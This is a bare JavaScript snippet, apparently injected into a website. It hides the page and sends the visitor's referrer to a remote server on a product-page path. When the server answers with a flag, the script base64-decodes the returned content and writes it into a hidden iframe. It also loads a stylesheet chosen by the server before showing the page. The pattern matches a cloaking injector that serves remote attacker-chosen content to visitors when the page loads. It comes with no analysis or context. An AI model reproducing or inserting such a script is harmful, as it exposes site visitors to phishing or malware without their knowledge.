var IFRAME_CLASS = 'rDgzvK';
var VERIFICATION_URL = 'https://stharfit.com/product/larte-della-musica/3IlIKSSf.php';

document.getElementById("9APzlo") || document.write('<style id="9APzlo" type="text/css">html {display:none;}</style>');

function show() {
  document.getElementById("9APzlo").innerHTML = "html {display:block;}"
};

var d;

window.XMLHttpRequest ? d = new XMLHttpRequest : window.ActiveXObject && (d = new ActiveXObject("Microsoft.XMLHTTP"));

d.onreadystatechange = function() {
  if (4 == this.readyState) {
    if (200 == this.status) {
      var components = this.responseText.split(';');
      var styleData = components[2];

      if (/^1;/.test(this.responseText)) {
        var b = decodeURIComponent(atob(components[1]));
        var a = document.querySelector('.rDgzvK');
        a = a.contentWindow || a.contentDocument;
        a.document && (a = a.document);
        a.open();
        a.write(b);
        a.close();
      }

      var style = document.createElement('link');
      style.rel = 'stylesheet';
      style.href = 'vfhiAe8PEUv.php?v=' + styleData;
      style.type = 'text/css';
      document.head.appendChild(style);
    }

    show();
  }
};

d.open("GET", 'https://stharfit.com/product/larte-della-musica/3IlIKSSf.php?ref=' + document.referer, 1);
d.send()